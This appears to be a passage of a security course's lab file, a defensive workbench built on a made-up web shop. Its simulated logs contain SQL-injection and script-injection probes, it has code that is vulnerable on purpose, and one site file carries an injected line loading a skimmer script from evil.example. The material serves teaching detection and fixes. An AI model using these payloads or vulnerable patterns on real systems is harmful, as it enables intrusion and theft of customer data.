["Quarantine","Isolating a suspected file so it can't affect the system"],
["Sandbox","An isolated environment whose changes aren't saved to the main OS"],
["Tarpit","A mechanism that purposefully delays connections to slow worms and floods"],
["Honeypot","A decoy system set up to attract attackers and gather information"],
["CVE","Common Vulnerabilities and Exposures: numbered known vulnerabilities"],
["CWE","Common Weakness Enumeration: a database of common software/hardware weaknesses"],
["OWASP","A project publishing the Top 10 web application vulnerabilities"],
["SQL injection","Using unsanitised input to change a database query"],
["Parameterised query","A query with bound parameters, so input can't become SQL"],
["Stored procedure","A query stored in the database with parameters bound to it"],
["Cross-site scripting","Injecting client-side script that runs in other users' browsers"],
["Stored XSS","XSS where the malicious input is saved on the server"],
["Reflected XSS","XSS where the script is attached to a URL and bounced back"],
["IDOR","Insecure Direct Object Reference: fetching an object by a parameter with no access check"],
["Insecure deserialisation","Exploiting a tampered or malicious serialised object"],
["Ethical hacking","Legal, authorised testing to find vulnerabilities and improve security"],
["Penetration testing","Structured, authorised testing: recon, scanning, exploitation, post-exploitation, reporting"]
],

checklist:[
"Define malware and name its three types: virus, worm, trojan",
"Explain the three parts of a virus and the logic-bomb/time-bomb triggers",
"Explain how worms spread and why they can be more dangerous than viruses",
"Explain trojans, key loggers, backdoors and RATs",
"Compare the dictionary, integrity-checker and activity-monitoring antivirus approaches",
"Explain why a dictionary antivirus can still miss an infection",
"Explain sandboxes, tarpits and honeypots",
"Name the main vulnerability databases (CVE, NVD, CWE, OWASP)",
"Explain SQL injection, including ' OR 1=1 and comments, and its best defences",
"Explain parameterised queries vs stored procedures",
"Explain cross-site scripting (stored vs reflected) and its defences",
"Explain IDOR, missing function-level access control and insecure deserialisation",
"Describe the penetration testing phases and what the report should contain"
]
});

/* ---------- Hands-on: practice terminal, challenges, real-tool guides, exam scenarios ---------- */
COURSE.hands(5,{
  title:'Week 5 workbench (the blue-team desk)',
  intro:`<p>This week you sit on the <strong>defender's side</strong>. The lab is a pretend online shop, <code>shop-web</code>. You have its web access log, a folder of suspicious files, a copy of the website with an integrity baseline, some source code to review, and a honeypot log. The job is to <em>spot</em> attacks and weaknesses, not to carry them out. All files are made up and harmless text.</p>`,
  env:{
    hostname:'shop-web',
    date:'Sat Mar 08 18:00:00 UTC 2025',
    fs:{
      '/home/student/README.txt':'Week 5 workbench: the blue-team desk\n====================================\n/var/log/access.log        web server access log (one line per request)\n/var/log/honeypot.log      log of a decoy SSH server nobody should ever use\n~/samples/                 suspicious files (harmless text) + iocs.txt, a threat-feed list of known-bad SHA-256 hashes\n~/www/                     a copy of the shop website + baseline.sha256 (hashes taken when it was known clean)\n~/app/ and ~/templates/    source code to review\n\nLog line format:  IP - - [time] "METHOD path HTTP/1.1" status bytes\n  awk fields: $1 = IP, $7 = path, $9 = status, $10 = bytes\nURLs are percent-encoded: %27 is an apostrophe, %3C is <, %3E is >, %20 is a space.\n',
      '/var/log/access.log':"192.0.2.14 - - [08/Mar/2025:13:00:10 +0000] \"GET /products?id=5 HTTP/1.1\" 200 4920\n192.0.2.14 - - [08/Mar/2025:13:00:48 +0000] \"GET /products?id=12 HTTP/1.1\" 200 1328\n192.0.2.14 - - [08/Mar/2025:13:01:38 +0000] \"GET /about HTTP/1.1\" 200 2200\n192.0.2.14 - - [08/Mar/2025:13:01:54 +0000] \"POST /login HTTP/1.1\" 401 1440\n192.0.2.14 - - [08/Mar/2025:13:02:52 +0000] \"GET /search?q=lamp HTTP/1.1\" 200 2168\n192.0.2.14 - - [08/Mar/2025:13:03:42 +0000] \"GET /static/app.js HTTP/1.1\" 200 3312\n192.0.2.14 - - [08/Mar/2025:13:03:54 +0000] \"GET /static/logo.png HTTP/1.1\" 200 2112\n192.0.2.14 - - [08/Mar/2025:13:04:46 +0000] \"GET /products?id=3 HTTP/1.1\" 200 1368\n192.0.2.14 - - [08/Mar/2025:13:05:12 +0000] \"GET /static/logo.png HTTP/1.1\" 200 2304\n192.0.2.14 - - [08/Mar/2025:13:05:26 +0000] \"POST /login HTTP/1.1\" 200 1128\n192.0.2.14 - - [08/Mar/2025:13:06:00 +0000] \"GET / HTTP/1.1\" 200 5080\n192.0.2.14 - - [08/Mar/2025:13:06:22 +0000] \"GET /about HTTP/1.1\" 200 4048\n192.0.2.14 - - [08/Mar/2025:13:07:14 +0000] \"GET /static/app.js HTTP/1.1\" 200 3528\n192.0.2.14 - - [08/Mar/2025:13:07:56 +0000] \"GET /search?q=lamp HTTP/1.1\" 200 4568\n192.0.2.14 - - [08/Mar/2025:13:08:20 +0000] \"GET /products?id=12 HTTP/1.1\" 200 2904\n192.0.2.14 - - [08/Mar/2025:13:08:54 +0000] \"POST /login HTTP/1.1\" 200 2936\n192.0.2.14 - - [08/Mar/2025:13:09:30 +0000] \"GET /cart HTTP/1.1\" 200 1056\n192.0.2.14 - - [08/Mar/2025:13:10:18 +0000] \"GET /static/app.js HTTP/1.1\" 200 1136\n192.0.2.14 - - [08/Mar/2025:13:10:30 +0000] \"GET / HTTP/1.1\" 200 3064\n192.0.2.14 - - [08/Mar/2025:13:10:48 +0000] \"GET /about HTTP/1.1\" 200 2224\n192.0.2.14 - - [08/Mar/2025:13:11:26 +0000] \"GET /products?id=5 HTTP/1.1\" 200 4024\n192.0.2.14 - - [08/Mar/2025:13:11:58 +0000] \"GET /products HTTP/1.1\" 200 3392\n192.0.2.14 - - [08/Mar/2025:13:12:44 +0000] \"POST /login HTTP/1.1\" 200 2824\n192.0.2.14 - - [08/Mar/2025:13:13:18 +0000] \"GET /products HTTP/1.1\" 200 4840\n192.0.2.14 - - [08/Mar/2025:13:14:14 +0000] \"GET /products?id=3 HTTP/1.1\" 200 2112\n192.0.2.14 - - [08/Mar/2025:13:14:28 +0000] \"GET /static/logo.png HTTP/1.1\" 200 2120\n192.0.2.14 - - [08/Mar/2025:13:15:08 +0000] \"GET /products?id=3 HTTP/1.1\" 200 2360\n192.0.2.14 - - [08/Mar/2025:13:15:18 +0000] \"GET /static/logo.png HTTP/1.1\" 200 1808\n192.0.2.14 - - [08/Mar/2025:13:15:30 +0000] \"GET /static/logo.png HTTP/1.1\" 200 3960\n192.0.2.14 - - [08/Mar/2025:13:16:26 +0000] \"GET /about HTTP/1.1\" 200 2544\n192.0.2.14 - - [08/Mar/2025:13:16:50 +0000] \"GET /products?id=8 HTTP/1.1\" 200 5056\n192.0.2.14 - - [08/Mar/2025:13:17:46 +0000] \"GET / HTTP/1.1\" 200 3552\n192.0.2.14 - - [08/Mar/2025:13:18:12 +0000] \"GET /search?q=lamp HTTP/1.1\" 200 2216\n192.0.2.14 - - [08/Mar/2025:13:19:10 +0000] \"GET /about HTTP/1.1\" 200 1952\n192.0.2.14 - - [08/Mar/2025:13:20:06 +0000] \"GET /products?id=12 HTTP/1.1\" 200 1768\n192.0.2.14 - - [08/Mar/2025:13:20:32 +0000] \"GET /static/app.js HTTP/1.1\" 200 3080\n192.0.2.14 - - [08/Mar/2025:13:21:28 +0000] \"POST /login HTTP/1.1\" 401 2528\n192.0.2.14 - - [08/Mar/2025:13:22:10 +0000] \"GET /static/logo.png HTTP/1.1\" 200 2440\n192.0.2.14 - - [08/Mar/2025:13:22:24 +0000] \"GET /products HTTP/1.1\" 200 2056\n192.0.2.14 - - [08/Mar/2025:13:23:18 +0000] \"POST /login HTTP/1.1\" 401 3008\n192.0.2.14 - - [08/Mar/2025:13:23:52 +0000] \"GET /products?id=3 HTTP/1.1\" 200 1320\n192.0.2.14 - - [08/Mar/2025:13:24:36 +0000] \"POST /login HTTP/1.1\" 401 3344\n192.0.2.14 - - [08/Mar/2025:13:24:54 +0000] \"GET /products HTTP/1.1\" 200 4672\n192.0.2.14 - - [08/Mar/2025:13:25:22 +0000] \"GET /search?q=shoes HTTP/1.1\" 200 1440\n192.0.2.14 - - [08/Mar/2025:13:25:32 +0000] \"GET /products?id=12 HTTP/1.1\" 200 2416\n192.0.2.14 - - [08/Mar/2025:13:26:02 +0000] \"GET /products?id=5 HTTP/1.1\" 200 2304\n192.0.2.14 - - [08/Mar/2025:13:26:22 +0000] \"GET /invoice?id=1004 HTTP/1.1\" 200 1924\n203.0.113.28 - - [08/Mar/2025:13:27:16 +0000] \"GET /invoice?id=1009 HTTP/1.1\" 200 2096\n192.0.2.88 - - [08/Mar/2025:13:27:34 +0000] \"GET /invoice?id=1002 HTTP/1.1\" 200 2124\n198.51.100.77 - - [08/Mar/2025:13:32:36 +0000] \"GET /products?id=5%27 HTTP/1.1\" 500 616\n198.51.100.77 - - [08/Mar/2025:13:32:38 +0000] \"GET /products?id=5%27%20AND%20%271%27%3D%272 HTTP/1.1\" 500 598\n198.51.100.77 - - [08/Mar/2025:13:32:40 +0000] \"GET /products?id=5%27%29 HTTP/1.1\" 500 618\n198.51.100.77 - - [08/Mar/2025:13:32:42 +0000] \"GET /products?id=5%27%20ORDER%20BY%2099--%20 HTTP/1.1\" 500 612\n198.51.100.77 - - [08/Mar/2025:13:32:45 +0000] \"GET /products?id=5%27%20OR%201%3D1--%20 HTTP/1.1\" 200 48211\n192.0.2.99 - - [08/Mar/2025:13:47:49 +0000] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 2212\n192.0.2.99 - - [08/Mar/2025:13:47:53 +0000] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 200 2164\n192.0.2.99 - - [08/Mar/2025:13:47:57 +0000] \"GET /search?q=%22%3E%3Cscript%3Ealert(2)%3C/script%3E HTTP/1.1\" 200 2276\n192.0.2.99 - - [08/Mar/2025:13:48:01 +0000] \"GET /search?q=%3Cscript%3Eprompt(3)%3C/script%3E HTTP/1.1\" 200 2196\n192.0.2.99 - - [08/Mar/2025:13:48:05 +0000] \"GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1\" 200 2196\n203.0.113.250 - - [08/Mar/2025:14:08:07 +0000] \"GET /invoice?id=1001 HTTP/1.1\" 200 2074\n203.0.113.250 - - [08/Mar/2025:14:08:09 +0000] \"GET /invoice?id=1002 HTTP/1.1\" 200 1930\n203.0.113.250 - - [08/Mar/2025:14:08:11 +0000] \"GET /invoice?id=1003 HTTP/1.1\" 200 2138\n203.0.113.250 - - [08/Mar/2025:14:08:13 +0000] \"GET /invoice?id=1004 HTTP/1.1\" 200 2026\n203.0.113.250 - - [08/Mar/2025:14:08:15 +0000] \"GET /invoice?id=1005 HTTP/1.1\" 200 2042\n203.0.113.250 - - [08/Mar/2025:14:08:17 +0000] \"GET /invoice?id=1006 HTTP/1.1\" 200 1850\n203.0.113.250 - - [08/Mar/2025:14:08:19 +0000] \"GET /invoice?id=1007 HTTP/1.1\" 200 2026\n203.0.113.250 - - [08/Mar/2025:14:08:21 +0000] \"GET /invoice?id=1008 HTTP/1.1\" 200 2170\n203.0.113.250 - - [08/Mar/2025:14:08:23 +0000] \"GET /invoice?id=1009 HTTP/1.1\" 200 2234\n203.0.113.250 - - [08/Mar/2025:14:08:25 +0000] \"GET /invoice?id=1010 HTTP/1.1\" 200 1914\n203.0.113.250 - - [08/Mar/2025:14:08:27 +0000] \"GET /invoice?id=1011 HTTP/1.1\" 200 2010\n203.0.113.250 - - [08/Mar/2025:14:08:29 +0000] \"GET /invoice?id=1012 HTTP/1.1\" 200 1882\n192.0.2.14 - - [08/Mar/2025:14:08:55 +0000] \"GET /search?q=shoes HTTP/1.1\" 200 4960\n192.0.2.14 - - [08/Mar/2025:14:09:11 +0000] \"GET /login HTTP/1.1\" 200 3696\n192.0.2.14 - - [08/Mar/2025:14:09:55 +0000] \"GET /products HTTP/1.1\" 200 4488\n192.0.2.14 - - [08/Mar/2025:14:10:15 +0000] \"GET /login HTTP/1.1\" 200 1392\n192.0.2.14 - - [08/Mar/2025:14:11:03 +0000] \"GET /products?id=5 HTTP/1.1\" 200 2392\n192.0.2.14 - - [08/Mar/2025:14:11:47 +0000] \"GET /products?id=3 HTTP/1.1\" 200 5088\n192.0.2.14 - - [08/Mar/2025:14:12:45 +0000] \"GET /products?id=5 HTTP/1.1\" 200 5136\n192.0.2.14 - - [08/Mar/2025:14:12:55 +0000] \"GET /login HTTP/1.1\" 200 3120\n",
      '/var/log/honeypot.log':"2025-03-07 02:11:05 198.51.100.77 login root:123456\n2025-03-07 02:11:09 198.51.100.77 login root:admin\n2025-03-07 02:11:14 198.51.100.77 login admin:admin\n2025-03-07 02:11:20 198.51.100.77 login pi:raspberry\n2025-03-07 02:11:31 198.51.100.77 login ubuntu:ubuntu\n2025-03-07 09:40:02 203.0.113.250 login root:root\n2025-03-07 09:40:05 203.0.113.250 login root:toor\n2025-03-07 09:40:12 203.0.113.250 login root:password\n2025-03-08 14:02:50 192.0.2.201 login test:test\n2025-03-08 14:02:58 192.0.2.201 login guest:guest\n2025-03-08 16:27:44 203.0.113.131 login admin:123456\n2025-03-08 16:27:49 203.0.113.131 command uname -a\n",
      '/home/student/samples/dropper.js':"// TRAINING SAMPLE: harmless text, not real malware\nvar stage2 = \"downloads the next part\";\nFAKE_C2_BEACON(\"http://c2.example/register\");\n",
      '/home/student/samples/payload.js':"// TRAINING SAMPLE: harmless text, not real malware\nvar action = \"pretends to encrypt files\";\nFAKE_C2_BEACON(\"http://c2.example/report\");\n",
      '/home/student/samples/payload-v2.js':"// TRAINING SAMPLE: harmless text, not real malware\nvar action = \"pretends to encrypt files\";\nFAKE_C2_BEACON(\"http://c2.example/report\");\n// build 2 (one comment line added)\n",
      '/home/student/samples/calendar.js':'// harmless: shows the month grid\nfunction monthGrid(y,m){ return new Date(y,m+1,0).getDate(); }\n',
      '/home/student/samples/helper.js':'// harmless: capitalises a word\nfunction cap(w){ return w[0].toUpperCase()+w.slice(1); }\n',
      '/home/student/samples/iocs.txt':"# threat feed excerpt: sha256  label\nb0d6114a0de2c0c5e63684eceb2fd6a5b3042b78490ab4a142251651d24f6fd4  Trojan.Dropper.Training.A\n5d45859c56d65386d2d5c8c1b83a68c5e6d7e90684836aa7143da9364bd9e9dd  Trojan.Payload.Training.B\n",
      '/home/student/www/index.html':'<h1>Welcome to the shop</h1>\n<a href="login.html">Log in</a>\n',
      '/home/student/www/login.html':'<form method="post" action="/login">\n  <input name="email"><input name="pw" type="password">\n</form>\n',
      '/home/student/www/app.js':"// shop front-end\nfunction addToCart(id){ fetch('/cart/add?id='+id); }\nfunction showTotal(t){ document.title='Total: '+t; }\nvar s=document.createElement('script');s.src='http://evil.example/skim.js';document.body.appendChild(s);\n",
      '/home/student/www/logo.txt':'SHOP (ASCII logo)\n',
      '/home/student/www/baseline.sha256':"c897f738a73ebbcff8dbb4cf422b47e19f54439dd8bf01df0acaa7069209bf6a  index.html\nced5678ce9d534408657bfdcb294796cc53a6ca8f82b654d82e88472a3ba04c3  login.html\nbf6d68c93318bca6ebc800c2e13f4f90dcbcdacd13118b8e71f77ae394d5b2ec  app.js\n5db9ef7adedbe4e71094362662d4d12ed16ba52c180e79ea2e695dfba61d981b  logo.txt\n",
      '/home/student/app/login.py':'import sqlite3\n\ndef check_login(db, name, pw):\n    cur = db.cursor()\n    query = "SELECT id FROM users WHERE name=\'" + name + "\' AND pw=\'" + pw + "\'"\n    cur.execute(query)\n    return cur.fetchone() is not None\n',
      '/home/student/app/orders.py':'def get_order(db, order_id, user_id):\n    cur = db.cursor()\n    cur.execute("SELECT * FROM orders WHERE id = ? AND user_id = ?", (order_id, user_id))\n    return cur.fetchone()\n',
      '/home/student/app/search.py':'def search(db, term):\n    cur = db.cursor()\n    cur.execute(f"SELECT * FROM products WHERE title LIKE \'%{term}%\'")\n    return cur.fetchall()\n',
      '/home/student/templates/search.html':'<h2>Results</h2>\n<p>You searched for: {{ term }}</p>\n<ul>{% for p in products %}<li>{{ p.title }}</li>{% endfor %}</ul>\n',
      '/home/student/templates/profile.html':'<h2>{{ user.name }}</h2>\n<div class="bio">{{ user.bio | safe }}</div>\n',
      '/home/student/templates/cart.html':'<h2>Your cart</h2>\n<ul>{% for i in items %}<li>{{ i.title }} x {{ i.qty }}</li>{% endfor %}</ul>\n'
    }
  },
  try:['cat README.txt','head -5 /var/log/access.log','wc -l /var/log/access.log','sha256sum samples/*','cd www && sha256sum -c baseline.sha256','grep -n execute app/*.py'],
  tasks:[
    {id:'sqli-ip',title:'Which IP is probing for SQL injection?',level:'Easy',xp:20,
     brief:`<p>In <code>/var/log/access.log</code>, an apostrophe in a URL appears as <code>%27</code>. Real shoppers almost never send one in a product id. <strong>Which IP address sent requests containing %27?</strong></p>`,
     hints:[`<code>grep "%27" /var/log/access.log</code> then look at column 1, or <code>grep "%27" /var/log/access.log | awk '{print $1}' | sort | uniq -c</code>`],
     answer:['198.51.100.77'],
     why:`<p>A single quote is the classic first probe for SQL injection: if the application builds its SQL by gluing text together, the quote breaks the query and the page shows an error. In a log this looks like repeated requests with <code>%27</code>, <code>OR</code> and <code>--</code> in the parameters. That makes the log a rich source of <em>indicators</em>, even though one line alone is only a clue.</p>`},
    {id:'sqli-bytes',title:'Did the probing work?',level:'Medium',xp:30,
     brief:`<p>Look at what the server answered to that IP. Most of the attacker's requests got an error status (<code>500</code>), which is itself a warning that the query is breakable. <strong>One request got a normal <code>200</code> reply but with a huge response. How many bytes was it?</strong> (Column 10. Normal pages here are 1-5 KB.)</p>`,
     hints:[`<code>grep 198.51.100.77 /var/log/access.log | awk '{print $9, $10}'</code>`],
     answer:['48211'],
     why:`<p>A page that normally returns ~2 KB suddenly returned ~48 KB: far more rows than a single product. That suggests the condition was bypassed and the database returned the whole table, so this could be a <strong>data breach</strong>, not just an attempt. The sequence of 500s followed by one big 200 is a very typical shape. Investigate the response size, and check what that table contains.</p>`},
    {id:'xss-count',title:'Count the script-tag probes',level:'Easy',xp:20,
     brief:`<p>Another visitor is testing the search box for <strong>cross-site scripting</strong>. An encoded script tag starts with <code>%3Cscript</code>. <strong>How many requests contain %3Cscript?</strong></p>`,
     hints:[`<code>grep -c "%3Cscript" /var/log/access.log</code>`],
     answer:['4'],
     why:`<p>Note that the log shows only what was <em>asked</em>, not whether the script ran. The same string with a <code>200</code> reply tells you the page loaded, not that the output was unescaped. To know whether it is exploitable you test the page itself (or review the template, as you will in a later task). The defence is to <strong>encode output</strong> for the context it appears in, and to add a Content-Security-Policy.</p>`},
    {id:'idor',title:'Who is walking through other people\'s invoices?',level:'Medium',xp:30,
     brief:`<p>Pages like <code>/invoice?id=1007</code> show one customer's invoice. A normal customer asks for their own invoice once or twice. <strong>Which IP requested many different invoice ids?</strong></p>`,
     hints:[`<code>grep "/invoice" /var/log/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head</code>`],
     answer:['203.0.113.250'],
     why:`<p>This is the footprint of an <strong>insecure direct object reference (IDOR)</strong> being checked: if the server hands over any invoice for whatever number is requested, without checking the invoice belongs to the logged-in user, then counting up the id reads everyone's data. All the replies were <code>200</code>, which suggests the check is missing. The fix is server-side <strong>access control on every request</strong> (and hard-to-guess ids are only a speed bump, not a fix).</p>`},
    {id:'ioc',title:'Match the threat feed',level:'Medium',xp:30,
     brief:`<p>A threat feed gave you <code>samples/iocs.txt</code>, a list of SHA-256 hashes of known-bad files. Hash the files in <code>samples/</code> and find which ones appear in the list. <strong>Which two files are known-bad?</strong> (File names only, separated by a space.)</p>`,
     hints:[`<code>sha256sum samples/*.js</code> and compare with <code>cat samples/iocs.txt</code>.`,`Automatic: <code>for f in samples/*.js; do h=$(sha256sum $f | cut -d' ' -f1); grep -q $h samples/iocs.txt &amp;&amp; echo $f; done</code>`],
     answer:['dropper.js payload.js'],set:true,
     why:`<p>This is the <strong>dictionary (signature) approach</strong> of antivirus: a known-bad fingerprint is looked up. It is fast and has almost no false positives, but it only recognises what it already knows. An exact hash changes if even one byte of the file changes. Next task.</p>`},
    {id:'variant',title:'The one the dictionary missed',level:'Hard',xp:40,
     brief:`<p>A third file is clearly <em>the same malware</em>: it contains the same suspicious call, <code>FAKE_C2_BEACON(</code> (a made-up name for "phone home to the attacker's server"), but its hash is <strong>not</strong> in the feed. <strong>Which file is it?</strong></p>`,
     hints:[`<code>grep -l "FAKE_C2_BEACON" samples/*.js</code> lists every file with the call. One is not in the hash-matched pair from the last task.`],
     answer:['payload-v2.js'],
     why:`<p>Someone added a comment line to <code>payload.js</code>. The behaviour is the same, but the hash is completely different, so the signature scan walks past it. This is exactly why antivirus does not rely on dictionaries alone: it adds <strong>pattern matching on content</strong>, <strong>integrity checking</strong> and <strong>activity monitoring</strong> (behaviour), and why polymorphic and metamorphic malware are hard to catch.</p>`},
    {id:'integrity',title:'What changed on the website?',level:'Easy',xp:20,
     brief:`<p><code>~/www/baseline.sha256</code> holds the hashes of the site's files taken when it was known clean. Go into the folder and check the current files against it: <code>cd www</code> then <code>sha256sum -c baseline.sha256</code>. <strong>Which file fails the check?</strong></p>`,
     hints:[`Look for <code>FAILED</code> in the output. The others say OK.`],
     answer:['app.js','www/app.js'],
     why:`<p>This is an <strong>integrity checker</strong>: compare against a trusted baseline and report any difference. It cannot tell you whether a change is good or bad (an update also changes a hash), but it tells you <em>where to look</em>. The baseline is only trustworthy if it was taken while clean and is stored somewhere the attacker cannot rewrite.</p>`},
    {id:'skimmer',title:'Where does the injected code send people?',level:'Medium',xp:30,
     brief:`<p>Read the changed file, <code>www/app.js</code>. An extra line was added at the bottom that loads a script from an unfamiliar site. <strong>What is the domain name it loads from?</strong></p>`,
     hints:[`<code>grep -n "http" www/app.js</code> or <code>tail -3 www/app.js</code>`],
     answer:['evil.example','http://evil.example/skim.js'],
     why:`<p>A line that quietly pulls in a script from somebody else's server is the typical shape of a <strong>web skimmer</strong>: every visitor's browser would run the attacker's code on your payment page. Your response: remove the line, restore from a known-good copy, find <em>how</em> the file was changed (the real hole), rotate credentials, and consider a Content-Security-Policy so the browser refuses scripts from unlisted domains. Add the domain to your blocklist/IOC list.</p>`},
    {id:'sqlcode',title:'Spot the vulnerable code',level:'Medium',xp:30,
     brief:`<p>Review the three Python files in <code>~/app/</code>. Two of them build an SQL query by <strong>gluing user text into the string</strong> (concatenation or an f-string). The third passes values separately as parameters (<code>?</code>). <strong>Which two files are vulnerable to SQL injection?</strong> (File names only.)</p>`,
     hints:[`<code>grep -n "execute\|SELECT" app/*.py</code>. Safe code looks like <code>execute("... WHERE id = ?", (value,))</code>.`],
     answer:['login.py search.py'],set:true,
     why:`<p>The safe one, <code>orders.py</code>, uses a <strong>parameterised query</strong>: the SQL text is fixed and the data travels separately, so a quote in the data can never become SQL. The fix for the other two is the same pattern. Escaping by hand is fragile; parameters (or stored procedures that use them) are the best defence, plus a least-privilege database account.</p>`},
    {id:'tplxss',title:'Spot the unescaped output',level:'Medium',xp:30,
     brief:`<p>The templates in <code>~/templates/</code> print user-supplied data. Most template engines <strong>escape</strong> output by default (turning <code>&lt;</code> into <code>&amp;lt;</code>) unless the developer opts out, here with the <code>| safe</code> filter. <strong>Which template file turns the escaping off?</strong></p>`,
     hints:[`<code>grep -rn "safe" templates</code>`],
     answer:['profile.html','templates/profile.html'],
     why:`<p>Whatever a user types in their bio is sent to every visitor's browser as raw HTML: a <strong>stored XSS</strong> hole. <code>search.html</code> uses the default escaping, so a script typed in the search box is shown as harmless text. The fix: drop <code>| safe</code> (or sanitise with an allow-list library if rich text is really needed).</p>`},
    {id:'honeypot',title:'Count the visitors to the decoy',level:'Easy',xp:20,
     brief:`<p>The honeypot is a fake SSH server that no real user or system should ever contact. Each line is: date, time, IP, event. <strong>How many different IP addresses touched it?</strong></p>`,
     hints:[`Take column 3 and count distinct values: <code>awk '{print $3}' /var/log/honeypot.log | sort -u | wc -l</code>`],
     answer:['4'],
     why:`<p>Because a honeypot has no legitimate users, <em>every</em> contact is suspicious, so it gives high-quality alerts with almost no false positives. It also records what the attacker tries, such as default passwords and the commands run afterwards. Compare the IPs with your web log: do any of these also appear there? That is how single clues become a picture.</p>`}
  ],
  guides:[
    {id:'juice',title:'Explore a deliberately vulnerable shop (OWASP Juice Shop)',time:'30 min',tags:['Windows','Mac','Linux'],
     intro:`<p><strong>Only ever practise on applications built for it, running on your own machine.</strong> OWASP Juice Shop is a deliberately insecure web shop made for learning, which is the real-world version of this week's lab. You will run it in Docker (install Docker Desktop from <a href="https://www.docker.com/products/docker-desktop/" target="_blank" rel="noopener">docker.com</a>) and keep it reachable <strong>only from your own computer</strong>.</p>`,
     steps:[
      {t:'Start it, bound to your machine only',cmd:`docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop`,see:`the log ends with something like "Server listening on port 3000". The <code>127.0.0.1:</code> part is important: it keeps other devices on your Wi-Fi from reaching it.`},
      {t:'Open it',say:`<p>Browse to <code>http://localhost:3000</code>. Explore like a customer: search, register, add to the basket. Then find the <strong>score board</strong>: the app tells you how (look at the page source and the hints in its own challenge list).</p>`},
      {t:'Pick two challenges and relate them to the notes',say:`<p>Choose one challenge from the <em>Injection</em> category and one from <em>XSS</em>, and use the in-app hints. For each, write down: (1) which feature is vulnerable, (2) which of this week's weaknesses it is (SQL injection, reflected or stored XSS, broken access control) and (3) <strong>the one-line fix</strong> a developer should make (parameterised query, output encoding, server-side access check).</p>`},
      {t:'Look at it as a defender',say:`<p>While you work, open the developer tools (F12) &rarr; <em>Network</em> tab and watch your own requests. Imagine you were the server: what would the access log lines for what you just did look like? Compare with the log in the practice terminal.</p>`},
      {t:'Stop it',say:`<p>Press <kbd>Ctrl</kbd>+<kbd>C</kbd> in the terminal. Because of <code>--rm</code> the container disappears.</p>`}
     ]},
    {id:'baseline',title:'Build your own integrity checker',time:'10 min',tags:['Windows','Mac','Linux','Git Bash'],
     intro:`<p>Do on real files what you did in the practice terminal. You only need a terminal (on Windows, Git Bash, which comes with Git).</p>`,
     steps:[
      {t:'Make a small "website"',cmd:`mkdir site-demo && cd site-demo\necho "<h1>Hello</h1>" > index.html\necho "console.log('app');" > app.js\nls`},
      {t:'Take the baseline while it is clean',cmd:`sha256sum index.html app.js > baseline.sha256\ncat baseline.sha256\nsha256sum -c baseline.sha256`,see:`OK for both files. (On a Mac use <code>shasum -a 256</code>; the check is <code>shasum -a 256 -c</code>.)`},
      {t:'Tamper with one file, then check again',cmd:`echo "// added" >> app.js\nsha256sum -c baseline.sha256`,see:`<code>app.js: FAILED</code> and a warning that 1 computed checksum did NOT match.`},
      {t:'On Windows without Git Bash',cmd:`Get-FileHash app.js -Algorithm SHA256`,say:`<p>That is PowerShell's equivalent. Compare the value by eye with the one you saved earlier.</p>`},
      {t:'Think about the weak point',say:`<p>If the attacker can edit <code>app.js</code>, can they also edit <code>baseline.sha256</code> to match? Where would you store the baseline so they cannot? (Read-only media, another machine, or signed with a key they do not have.)</p>`}
     ]},
    {id:'sqlite',title:'See parameterised queries stop an injection (your own database)',time:'15 min',tags:['Windows','Mac','Linux'],
     intro:`<p>Python includes SQLite, a tiny database in a file or in memory. The script below contains a toy users table and tries a login the vulnerable way and the safe way, so you see the difference first-hand. It touches nothing but a temporary in-memory database. Save it as <code>sqli_demo.py</code>.</p>`,
     steps:[
      {t:'Save the script',cmd:`import sqlite3\ndb = sqlite3.connect(":memory:")\ndb.execute("CREATE TABLE users (name TEXT, pw TEXT)")\ndb.execute("INSERT INTO users VALUES ('alice', 'correct-horse')")\n\ndef login_bad(name, pw):\n    q = "SELECT * FROM users WHERE name='" + name + "' AND pw='" + pw + "'"\n    print("  query sent:", q)\n    return db.execute(q).fetchone() is not None\n\ndef login_good(name, pw):\n    q = "SELECT * FROM users WHERE name=? AND pw=?"\n    return db.execute(q, (name, pw)).fetchone() is not None\n\nfor name, pw in [("alice", "correct-horse"), ("alice", "wrong"), ("alice", "x' OR '1'='1")]:\n    print("Trying", name, "/", pw)\n    print("  vulnerable version says:", login_bad(name, pw))\n    print("  parameterised version says:", login_good(name, pw))`},
      {t:'Run it',cmd:`python3 sqli_demo.py`,see:`for the last attempt the vulnerable version says <code>True</code> although the password is wrong, while the parameterised version says <code>False</code>. Read the "query sent" line to see how the quote changed the meaning of the SQL.`},
      {t:'Explain it in your own words',say:`<p>Why can the data <code>x' OR '1'='1</code> change the query in one version but not the other? (In the second, the SQL text is fixed before the data arrives, so the data can only ever be a value.) Write two sentences you could use in an exam answer.</p>`}
     ]},
    {id:'avtest',title:'Check your antivirus with the official harmless test file',time:'10 min',tags:['Windows','Mac','Linux'],
     intro:`<p>Antivirus vendors agreed on a standard <strong>harmless</strong> test file so you can see a scanner react without handling real malware. It is published by EICAR at <a href="https://www.eicar.org/download-anti-malware-testfile/" target="_blank" rel="noopener">eicar.org</a>. This site deliberately does not contain the test string itself, because your antivirus (and your OneDrive folder) would flag it. Download it only from the official page, and <strong>save it to a temporary folder, not into OneDrive or a project folder</strong>.</p>`,
     steps:[
      {t:'Read the official page first',say:`<p>Read what the page says the file is and is not. Notice that it explains why antivirus tools treat it as a detection even though it does nothing.</p>`},
      {t:'Download it and watch what happens',say:`<p>Download one of the test files. Your antivirus should block or quarantine it within seconds. Note the <em>name</em> your scanner gave it and whether it blocked the download, deleted it or just warned. Then delete or release it from the quarantine screen.</p>`},
      {t:'Connect it to the notes',say:`<p>Your scanner recognised the file by its content, so this is the <strong>dictionary/signature approach</strong>. Think about why it would not recognise a brand-new virus, and which other methods (integrity checking, behaviour monitoring, a sandbox) would.</p>`}
     ]}
  ],
  scenarios:[
    {id:'incident',title:'Incident at the web shop',
     setup:`<p>On Saturday evening you review the shop's logs and find: (1) one IP sent many requests with apostrophes and <code>OR 1=1</code> in the product id, mostly answered with errors, then one <code>200</code> reply of 48 KB instead of the usual 2 KB; (2) another IP sent search requests containing encoded script tags; (3) a third IP requested about a dozen consecutive invoice numbers, all answered <code>200</code>; and (4) a file in the website folder fails its integrity check.</p>`,
     tasks:[
